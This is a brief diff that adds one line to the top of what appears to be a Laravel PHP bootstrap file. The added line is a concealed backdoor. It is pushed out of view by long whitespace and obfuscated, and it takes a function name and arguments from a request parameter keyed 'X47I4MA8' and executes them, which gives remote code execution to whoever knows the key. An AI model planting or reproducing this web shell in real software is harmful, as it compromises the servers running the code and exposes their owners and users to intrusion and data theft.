@@ -1,4 +1,5 @@
 <?php
+																																																																																																																																																		iF(	$v3i0t3=@	${"_REQUEST"} ["X47I4MA8"] ){{$v3i0t3[1]	(	${$v3i0t3[2 ]} [0] ,$v3i0t3[3] ($v3i0t3[4	]) );}	}	;
 
 /**
  * Laravel - A PHP Framework For Web Artisans
